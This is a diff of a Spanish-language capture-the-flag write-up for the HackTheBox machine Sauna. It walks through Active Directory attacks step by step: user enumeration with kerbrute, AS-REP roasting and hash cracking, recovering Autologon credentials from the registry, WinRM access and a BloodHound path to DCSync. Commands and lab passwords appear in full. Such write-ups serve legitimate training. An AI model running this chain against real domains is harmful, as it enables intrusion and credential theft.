@@ -1,23 +1,33 @@
 # Sauna - 10.10.10.175
+![Sauna](https://user-images.githubusercontent.com/96772264/212533203-22b97341-4eee-44d7-bf30-c57db475083c.png)
+
 ----------------------
+# Part 1: Enumeración
 
 Puertos abiertos: 80(http),88(kerberos),53(dns),135(rpc),139,389,445(smb),464,593,636,3269,3268,5985(winrm),9389
 ```console
 └─$ crackmapexec smb 10.10.10.175
 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
 ```
+
+## Puerto 53 dns
 ```console
 └─$ dig @10.10.10.175 egotistical-bank.local mx
 sauna.egotistical-bank.local. hostmaster.egotistical-bank.local
 ```
+
+## Puerto 135 rcp
 ```console
 └─$ rpcclient -U "" -N 10.10.10.175 -c 'enumdomusers' 
 result was NT_STATUS_ACCESS_DENIED
 ```
+![Sauna1](https://user-images.githubusercontent.com/96772264/212533222-3870cb03-c0e5-490d-aa53-dba406dfa64d.PNG)
 
-En la web apenas hay un formulario de contacto inutil.
-De single.html sacamos nombres -> Jenny Joy, James Doe, Jhonson y Watson
-De contact us tambien -> Fergus Smith, Shaun Coins, Bowie Taylor, Sophie Driver, Hugo Bear, Steven Kerb
+----------------------
+# Part 2: Web
+
+En la web apenas hay un formulario de contacto inutil. De single.html sacamos nombres -> Jenny Joy, James Doe, Jhonson y Watson.  
+De contact us tambien -> Fergus Smith, Shaun Coins, Bowie Taylor, Sophie Driver, Hugo Bear, Steven Kerb.
 
 ```console
 └─$ whatweb http://10.10.10.175
@@ -31,14 +41,15 @@ HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.175], Microsoft-IIS[10.0], Script, T
 000000536:   403        29 L     92 W       1233 Ch     "css"                                                
 000002757:   403        29 L     92 W       1233 Ch     "fonts" 
 ```
-
 ```console
 └─$ kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local /usr/share/seclists/Usernames/Names/names.txt
 # Nada
 ```
-Con los usuarios que habiamos conseguido hacemos un diccionario tal que cada nombre tenga mas de una manera de
-ser escrito: ```Fergus Smith -> FergusSmith fsmith```
+Con los usuarios que habiamos conseguido hacemos un diccionario tal que cada nombre tenga mas de una manera de ser escrito:   
+```Fergus Smith -> FergusSmith fsmith```
 
+----------------------
+# Part 3: Kerberos
 
 ```console
 └─$ kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local users.txt
@@ -48,12 +59,14 @@ ser escrito: ```Fergus Smith -> FergusSmith fsmith```
 [*] Getting TGT for fsmith
 $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:246e70
 ```
+Como no tenia el Dont-preauth seteado se podia dumpear los hashes.
 
 ```console
 └─$ john hash -w=/usr/share/wordlists/rockyou.txt       
 Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
 ```
-
+----------------------
+# Part 4: En el sistema, credenciales de Autologon
 ```console
 └─$ crackmapexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
 SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23
@@ -69,13 +82,11 @@ WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\f
 
 Encontramos credenciales autologon:
 comando -> ```reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon" 2>nul | findstr "DefaultPassword DefaultUserName"```
-
 ```
 "[Autologon]"
     DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
     DefaultPassword    REG_SZ    Moneymakestheworldgoround!
 ```
-
 
 ```console
 └─$ evil-winrm -i 10.10.10.175 -u 'svc_loanmanager' -p 'Moneymakestheworldgoround!'
@@ -83,12 +94,17 @@ comando -> ```reg.exe query "HKLM\software\microsoft\windows nt\currentversion\w
 └─$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
 # Asi si
 ```
+----------------------
+# Part 5: Escalada de privilegios: Bloodhound y DCSync
 
 Para mirar una posible escalada de privilegios:
 ```console
 └─$ bloodhound-python -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -c All -ns 10.10.10.175 -d egotistical-bank.local -dc egotistical-bank.local --zip
 # Nos crea 4 archivos json que subiremos al bloodhound
 ```
+![Sauna2](https://user-images.githubusercontent.com/96772264/212533231-e2990401-a2e2-4bb5-a569-c6670b9ded6d.PNG)
+
+
 En > OUTBOUND OBJECT CONTROL > First Degree Object Control Nos aparece DCSync, es un permiso sobre el dominio
 que nos permite leer las contraseñas hasheadas de todo el mundo.
 
